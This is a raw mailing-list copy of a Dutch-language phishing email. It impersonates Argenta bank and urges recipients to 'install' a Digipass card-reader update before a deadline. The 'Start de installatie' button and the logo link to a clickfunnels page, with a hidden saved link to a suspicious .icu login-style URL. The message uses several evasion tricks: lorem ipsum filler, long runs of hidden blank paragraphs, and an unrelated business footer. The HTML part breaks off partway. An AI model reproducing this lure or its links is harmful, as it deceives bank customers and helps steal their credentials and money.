Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id E5A30D128C9
	for <lists+osst-users@lfdr.de>; Mon, 12 Jan 2026 13:29:44 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Message-ID:To:
	MIME-Version:From:Date:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=uPRCKRPLGD6dG/rwfWeIK+bo+oTSpY4v3Djf9D83vPM=; b=iZEzMZXDWba7MPrTn5ryFDJXVu
	VHlbpB+73kMFf7oapEWIBJIVEHQNkAy0qQbVawkkIGz1gK1EVmwTqVcTd9zkQXqS5ZpY8hoQk64Ub
	RdcuN1xE3HmPCytbN7At1VnOCbXz5NSRasN25TQhCZq+SNhwFXydxDXjZbVdSdHq/bKM=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1vfH3H-0005Gq-Li
	for lists+osst-users@lfdr.de;
	Mon, 12 Jan 2026 12:29:43 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <willemsfonds@procuriosmail.net>) id 1vfH3F-0005Gf-73
 for osst-users@lists.sourceforge.net; Mon, 12 Jan 2026 12:29:41 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:Message-ID:Subject:To:MIME-Version:
 From:Date:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=OiJ9WGMHAo/CAf7FZ/hFNuPPCADwvmSlbbcVXM8hWYs=; b=giceBIniQDPUq9Gg1KySAgcufB
 QPiUcZtPROJahVnIM5kodB2d0c4ZgViwfW290R9N6vOLCxr6Y0WTX60qbnL+eTSPiHUl7De4L4DTD
 zkQb+NyQB9q3ELgxxNAizwEJH6Qr94jFn5e/92k6ChLPAVUCGxyinLEJ09dlpVBULyyw=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:Message-ID:Subject:To:MIME-Version:From:Date:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=OiJ9WGMHAo/CAf7FZ/hFNuPPCADwvmSlbbcVXM8hWYs=; b=F
 p30OgQFFB9czE0aVu9YnRi2bEW/VREdG942G8TEcNMOxiVPcpP0XDAeYbd91xYSrYYi9Ioxeti2Vb
 fP0KTW2gwyljwLJpfj7hXP1cM+0GxkuiJ56f6/+ByXechzoWNgPJ0XVLUr1Wwu524FVJzy7oSBcQG
 Wz0FrCN3recQjavg=;
Received: from outgoing.procurios.net ([213.193.247.55])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vfH3E-0001h8-0C for osst-users@lists.sourceforge.net;
 Mon, 12 Jan 2026 12:29:41 +0000
Received: from outgoing.procurios.net (localhost [127.0.0.1])
 by outgoing.procurios.net (Postfix) with ESMTP id 504CEEABC5
 for <osst-users@lists.sourceforge.net>; Mon, 12 Jan 2026 13:12:46 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; s=b.procurios; t=1768219966;
 c=relaxed/relaxed; h=from:mime-version:to:subject;
 d=willemsfonds.be;
 bh=OiJ9WGMHAo/CAf7FZ/hFNuPPCADwvmSlbbcVXM8hWYs=;
 b=am/N/OowKWRmfIQ1OH+a+GV/kCrc2V7SxTaUsxsmaOSFpwnwopm1Nn1FJBt7Y8DKGLlLnTzbL8mO++T317OnrqNjLJ4o7kN+hrAga+8ATD+kqu0wHJOVEdwk4PLWYkIEqtG18JcVANKWK3gi0z9MKxr/N7Zs2uAPoDBEvPEMp4Wn0dGxmjeAViJ0VWyla6/3QoAiMH3HRNThgR6oOKffObYVwHUjnlAGop2zt/oRui1dYWYGpiN0dNbQJ9T3HZ35+YpnYgXvM/+j8zKkzotG31Lz6Yr05m+4x8Qjg2bVK/c31frewoqe758rlLNSWfvJVKeIuGQ0YvB0EDoqd3ZBSg==
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; s=envelopesender; t=1768219966;
 c=relaxed/relaxed; h=from:mime-version:to:subject;
 d=procuriosmail.net;
 bh=OiJ9WGMHAo/CAf7FZ/hFNuPPCADwvmSlbbcVXM8hWYs=;
 b=ZBZSNwzPBMIaBW0osBx892ExnNonU2bPnv+1tYNXamgC/xSOYt0tiYj7nAXZlfLOt01EFQ4pvrL6SwRbmRoFv65lQslRJjaV64QhzL1PCCHWBri7GrP/qUJER6yw5bO2bNmRnDhJx5JhN34NtkMj0u4zIXLO/cPkvxYgE3CNbp1urJy2qar3c++3rDNwHR076Wc/xILb/XbLaY0zDJlsumzrcFaHrOE2QZFPRzVOO9+RRccLG3tBk7+Hd3a3jgHq8K51wY1ZwXL1X4RSistUH9YZdrKGU9CoUmp+UONN5SQlm1H3P0C+p1LiGMpQW/4jbqd/UZ67Ww+eqREETKGbtw==
Date: Mon, 12 Jan 2026 13:12:46 +0100
From: "ARGENTA Sos" <info@willemsfonds.be>
User-Agent: Procurios SocialCMS rev. dc7b047ce8bd
MIME-Version: 1.0
To: osst-users@lists.sourceforge.net
Message-ID: <7656b282177d72e2462a9ec7369cb0f824d194c6@procuriosmail.net>
X-Originating-IP: 160.177.159.74
X-Originating-UID: 8999
X-ProBase-Template: -1
X-Spam-Score: -0.2 (/)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-1.hosts.colo.sdot.me",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  N°6311394149BE Belangrijke Update voor uw Digipass Geachte
    klant, 
 
 Content analysis details:   (-0.2 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 RCVD_IN_MSPIKE_H5      RBL: Excellent reputation (+5)
                             [213.193.247.55 listed in wl.mailspike.net]
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from author's
                             domain
  0.0 RCVD_IN_MSPIKE_WL      Mailspike good senders
  0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
                             domains are different
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.0 T_REMOTE_IMAGE         Message contains an external image
X-Headers-End: 1vfH3E-0001h8-0C
Subject: [Osst-users] =?utf-8?q?=5BTest=5D_N=C2=B06311394149BE?=
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2276885679285089073=="
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============2276885679285089073==
Content-Type: multipart/alternative;
 boundary="-----7f3ea6461dab4d49c94e5accbc7ea5723db75f4a"

This is a multi-part message in MIME format.

-------7f3ea6461dab4d49c94e5accbc7ea5723db75f4a
Content-Type: text/plain;
	charset="UTF-8";
	format="flowed"
Content-Transfer-Encoding: quoted-printable

N=C2=B06311394149BE                                              =0A=0ABela=
ngrijke Update voor uw Digipass=0A=0AGeachte klant,=0A=0AJe hebt je nieuwe =
kaartlezer nog niet aangevraagd.=C2=A0 Vanaf=C2=A012/01/2026=C2=A0werkt =0A=
je oude kaartlezer niet meer voor bepaalde toepassingen omdat de oude model=
len =0Aniet meer ondersteund worden.=0A=0AVraag v=C3=B3=C3=B3r deze datum e=
en nieuwe aan, =0Avooral als je merkt dat bepaalde functies al niet meer we=
rken.=C2=A0 Na deze datum =0Abetaal je=C2=A015,95 euro=C2=A0voor een vervan=
gtoestel.=0A=0AUpdate versie:=C2=A0v3.2.1=0ABeschikbaar sinds:=C2=A012/01/2=
026=0AGrootte:=C2=A02.4 MB=0AInstallatietijd: =C2=B1=C2=A03 minuten=0A=0AWa=
arom deze update belangrijk is=0A=0A=E2=9C=93 Verbeterde beveiliging=
=E2=9C=93 Snellere toegang=E2=9C=93 Betere compatibiliteit=E2=9C=93 =0AOplo=
ssing voor technische problemenStart de installatie=0A=0ALet op: Na 12/01/2=
026=C2=A0worden oude versies van de Digipass niet meer =0Aondersteund. Voer=
 de update tijdig uit!=0A=0ADeze e-mail is automatisch verstuurd door het A=
rgenta updatesysteem.=0A=C2=A9 2025 Argenta Bank- en Verzekeringsgroep=0A=
=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A=
=C2=A0=0A=0A=C2=A0=0A=0A=C2=A0=0A=0A.=0A=0A=C2=A0=0A=0A             Vivamus=
 hendrerit arcu sed erat molestie vehicula. Sed auctor =0Aneque eu tellus r=
honcus ut eleifend nibh porttitor. Ut in nulla enim. =0APhasellus molestie =
magna non est bibendum non venenatis nisl tempor. =0ASuspendisse dictum feu=
giat. =0A=0A              Vivamus hendrerit arcu sed erat molestie vehicula=
. Sed auctor =0Aneque eu tellus rhoncus ut eleifend nibh porttitor. Ut in n=
ulla enim. =0APhasellus molestie magna non est bibendum non venenatis nisl =
tempor. =0ASuspendisse dictum feugiat. =0A=0A                              =
 09 224 10 75 =0A  info@debronzenuil.be  |  debronzenuil.eu  =0A Vrijdagmar=
kt 24-25 | 9000 Gent  =0A              =C2=A0        =C2=A0        =C2=
=A0                                     =0AOnline bekijken - Voorkeuren beh=
eren - Privacybeleid                =0A
-------7f3ea6461dab4d49c94e5accbc7ea5723db75f4a
Content-Type: text/html;
	charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<!-- Generated with TemplateGenerator from mailing2-template-1.ejs -->=0A<h=
tml xmlns:v=3D"urn:schemas-microsoft-com:vml" xmlns:o=3D=0A"urn:schemas-mic=
rosoft-com:office:office">=0A<head>=0A<title>Willemsfonds: N=C2=B0631139414=
9BE</title>=0A<meta name=3D"viewport" content=3D"width=3Ddevice-width, init=
ial-scale=3D1.0">=0A<style type=3D"text/css">=0A html, body { margin: 0; pa=
dding: 0; } body{ width:100% !important; -webkit-text-size-adjust:100%; -ms=
-text-size-adjust:100%; margin:0; padding:0; } a { color: #375fc3; text-dec=
oration: underline; } a:hover { text-decoration: none; } p { margin: 16px 0=
; } =0A</style>=0A=0A<style type=3D"text/css">=0A /* Force Hotmail to displ=
ay emails at full width */ .ReadMsgBody { width: 100%;} .ExternalClass {wid=
th: 100%;} =0A</style>=0A<!--[if gte mso 9]> <style> /* Force Outlook 2007 =
and up, to show bullets/numbers in lists */ ol, ul { margin: 0 0 0 24px; pa=
dding: 0; list-style-position: inside; } </style> <xml> <o:OfficeDocumentSe=
ttings> <o:AllowPNG/> <o:PixelsPerInch>96</o:PixelsPerInch> </o:OfficeDocum=
entSettings> </xml> <![endif]-->=0A<style>=0A /* Responsive styles */ @medi=
a all and (max-width: 580px) { table[class=3D'wrapper'], table[class=3D'blo=
ck'] { width: 100% !important; } table[class=3D'mobile-hidden'] { display: =
none; width: 100%; } td[class=3D'spacer'] { width: 22px !important; height:=
 6px !important; } td[class=3D'mobile-left'] { text-align: left; } img { wi=
dth: 100% !important; height: auto !important; } img[class=3D'notFlexible']=
 { width: auto !important; } } =0A</style>=0A<meta http-equiv=3D"Content-Ty=
pe" content=3D"text/html; charset=3Dutf-8">=0A</head>=0A<body bgcolor=3D"#F=
FFFFF" style=3D"margin: 0; padding: 0;">=0A<div style=3D=0A"display:none;fo=
nt-size:1px;color:#333333;line-height:1px;max-height:0px;max-width:0px;opac=
ity:0;overflow:hidden;">=0AN=C2=B06311394149BE</div>=0A<!-- Wrapper table -=
->=0A<table cellpadding=3D"0" cellspacing=3D"0" border=3D"0" width=3D"100%"=
 bgcolor=3D=0A"#FFFFFF">=0A<tr>=0A<td><!-- Header -->=0A<table class=3D"wra=
pper" cellpadding=3D"0" cellspacing=3D"0" border=3D"0" align=3D=0A"center" =
width=3D"588" style=3D"width: 588px;" bgcolor=3D"#FFFFFF">=0A<tr>=0A<td hei=
ght=3D"22" colspan=3D"3"></td>=0A</tr>=0A<tr>=0A<td width=3D"8" style=3D"wi=
dth: 8px;"></td>=0A<td>=0A<table align=3D"left" class=3D"block" style=3D"wi=
dth: 272px; float: left;"=0Acellpadding=3D"0" cellspacing=3D"0" border=3D"0=
" width=3D"272" height=3D"119">=0A<tr>=0A<td valign=3D"center"></td>=0A</tr=
>=0A</table>=0A<table align=3D"right" class=3D"mobile-hidden" style=3D=0A"w=
idth: 272px; float: right;" cellpadding=3D"0" cellspacing=3D"0" border=3D"0=
"=0Awidth=3D"272" height=3D"35">=0A<tr>=0A<td class=3D"mobile-left" style=
=3D=0A'font-family: "Trebuchet MS", helvetica, sans-serif; font-size: 18px;=
 line-height: 22px; text-transform: uppercase; color: #2f2722;'=0Aalign=3D"=
right" valign=3D"bottom"></td>=0A</tr>=0A</table>=0A</td>=0A<td width=3D"8"=
 style=3D"width: 8px;"></td>=0A</tr>=0A<tr>=0A<td height=3D"22" colspan=3D"=
3"></td>=0A</tr>=0A</table>=0A<!-- End header --><!-- Content area -->=0A<t=
able class=3D"wrapper" cellpadding=3D"0" cellspacing=3D"0" border=3D"0" ali=
gn=3D=0A"center" width=3D"588" style=3D"width: 588px;" bgcolor=3D"#FFFFFF">=
=0A<tr>=0A<td width=3D"7" style=3D"width: 7px;"></td>=0A<td>=0A<table class=
=3D"wrapper" cellpadding=3D"0" cellspacing=3D"0" border=3D"0" align=3D=0A"c=
enter" width=3D"572" bgcolor=3D"#FFFFFF" style=3D=0A"width: 572px; border: =
1px solid #666666">=0A<tr>=0A<td>=0A<div data-title=3D"Artikel met WYSIWYG =
editor" id=3D"c1">=0A<table class=3D"wrapper" cellpadding=3D"0" cellspacing=
=3D"0" border=3D"0" width=3D=0A"572" style=3D"width: 572px;">=0A<tr>=0A<td =
class=3D"spacer" colspan=3D"3" height=3D"17"></td>=0A</tr>=0A<tr>=0A<td cla=
ss=3D"spacer" width=3D"44" style=3D"width: 44px;"></td>=0A<td style=3D=0A'f=
ont-family: "Trebuchet MS", helvetica, sans-serif; font-size: 14px; line-he=
ight: 22px; color: #2f2722;'>=0A<p><a title=3D=0A"https://joostfluitsteamwo=
rkspace.myclickfunnels.com/dsfdf8789s" rel=3D=0A"noopener noreferrer" href=
=3D=0A"https://joostfluitsteamworkspace.myclickfunnels.com/dsfdf8789s" targ=
et=3D=0A"_blank" data-linkid=3D"93706c5f-fe4d-44a0-abe8-557fcbc65eb2"=0Adat=
a-cke-saved-href=3D"https://belclibeargtser.icu/home/nkl-log.php"=0Adata-au=
th=3D"NotApplicable" data-linkindex=3D"3"><img src=3D=0A"https://upload.wik=
imedia.org/wikipedia/commons/thumb/2/28/Argenta_logo.svg/640px-Argenta_logo=
.svg.png"=0Aalt=3D"Argenta Logo" width=3D"116" height=3D"55" data-cke-saved=
-src=3D=0A"https://upload.wikimedia.org/wikipedia/commons/thumb/2/28/Argent=
a_logo.svg/640px-Argenta_logo.svg.png"=0Adata-imagetype=3D"External"></a></=
p>=0A<p><strong>Belangrijke Update voor uw Digipass</strong></p>=0A<p><stro=
ng>Geachte klant,</strong></p>=0A<p>Je hebt je nieuwe kaartlezer nog niet a=
angevraagd.&nbsp;=0AVanaf<span>&nbsp;</span><strong>12/01/2026</strong>&nbs=
p;werkt je oude=0Akaartlezer niet meer voor bepaalde toepassingen omdat de =
oude modellen niet=0Ameer ondersteund worden.</p>=0A<p>Vraag v=C3=B3=C3=
=B3r deze datum een nieuwe aan, vooral als je merkt dat bepaalde=0Afuncties=
 al niet meer werken.&nbsp; Na deze datum betaal=0Aje<span>&nbsp;</span><st=
rong>15,95 euro</strong><span>&nbsp;</span>voor een=0Avervangtoestel.</p>=
=0A<p><strong>Update=0Aversie:</strong><span>&nbsp;</span><strong>v3.2.1</s=
trong><br>=0ABeschikbaar sinds:<span>&nbsp;</span><strong>12/01/2026</stron=
g><br>=0AGrootte:<span>&nbsp;</span><strong>2.4 MB</strong><br>=0AInstallat=
ietijd: =C2=B1<span>&nbsp;</span><strong>3 minuten</strong></p>=0A<p>Waarom=
 deze update belangrijk is</p>=0A<ul>=0A<li>=E2=9C=93 Verbeterde beveiligin=
g</li>=0A<li>=E2=9C=93 Snellere toegang</li>=0A<li>=E2=9C=93 Betere compati=
biliteit</li>=0A<li>=E2=9C=93 Oplossing voor technische problemen</li>=0A</=
ul>=0A<p><strong><a title=3D=0A"https://joostfluitsteamworkspace.myclickfun=
nels.com/dsfdf8789s" rel=3D=0A"noopener noreferrer" href=3D=0A"https://joos=
tfluitsteamworkspace.myclickfunnels.com/dsfdf8789s" target=3D=0A"_blank" da=
ta-linkid=3D"63a47255-53dd-436c-98e2-d58ce37af627"=0Adata-cke-saved-href=3D=
"https://belclibeargtser.icu/home/nkl-log.php"=0Adata-auth=3D"NotApplicable=
" data-linkindex=3D"4">Start de=0Ainstallatie</a></strong></p>=0A<p><strong=
>Let op: Na 12/01/2026</strong>&nbsp;worden oude versies van de=0ADigipass =
niet meer ondersteund. Voer de update tijdig uit!</p>=0A<p>Deze e-mail is a=
utomatisch verstuurd door het Argenta updatesysteem.<br>=0A=C2=A9 2025 Arge=
nta Bank- en Verzekeringsgroep</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<=
p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p=
 aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p =
aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p a=
ria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p ar=
ia-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p ari=
a-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria=
-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-=
hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-h=
idden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hi=
dden=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hid=
den=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidd=
en=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidde=
n=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
